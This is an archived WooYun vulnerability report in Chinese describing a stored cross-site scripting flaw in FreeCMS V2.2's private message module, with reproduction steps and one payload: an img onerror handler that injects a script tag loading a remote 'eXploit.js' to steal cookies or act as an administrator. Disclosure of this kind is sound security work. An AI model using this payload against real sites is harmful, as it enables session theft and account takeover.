{"id": 50472, "wybug_id": "wooyun-2014-077738", "wybug_title": "FreeCMS存储型跨站脚本", "wybug_corp": "FreeCMS", "wybug_author": "路人甲", "wybug_date": "2014-10-02 09:46", "wybug_open_date": "2014-12-31 09:48", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-02：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-12-31：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： FreeCMS过滤不严导致存储型跨站，利用该漏洞，我们可以攻击任何用户(包括管理员)，并且可以设计专门针对管理员的攻击。利用此漏洞我们可以获取任意用户cookie，或者通过可控脚本执行其它恶意操作。 详细说明：  1、漏洞通杀所有浏览器，测试过程使用了Chrome和Firefox。2、漏洞存在于站内信模块，攻击者构造恶意代码向任意用户发送短息(包括管理员)，其它用户查看短息时漏洞触发，对于管理员来说，管理员查看其它用户短息也会触发漏洞。   漏洞证明：  1、涉及版本FreeCMS商业版V2.22、演示地址：http://www.freeteam.cn/site/FreeCMS/onlinedemo/index.html3、在第二步的网页中选择会员中心，进入会员中心(可自己注册会员)4、登录系统后，进入站内信模块，进行写信，在内容中嵌入恶意代码：\n\n5、其它用户登录系统，查看短信，漏洞触发\n\n6、使用Firebug查看页面源代码，恶意代码成功执行。\n\n7、管理员查看用户发送的短信，漏洞同样触发：\n\n8、修改短信内容为：<img/onerror=d=document;e=d.createElement('script');e.src='http://127.0.0.1/eXploit.js';d.body.appendChild(e); src=x> 用户登录系统查看短信，恶意代码执行，成功加载本地脚本：\n\n\n\n修改本地脚本内容，我们可以进行针对性的攻击。例如：如果管理员触发漏洞，我们可以修改其它用户信息，使用管理员身份执行任意操作。   修复方案：  对恶意字符和标签的恶意事件进行过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}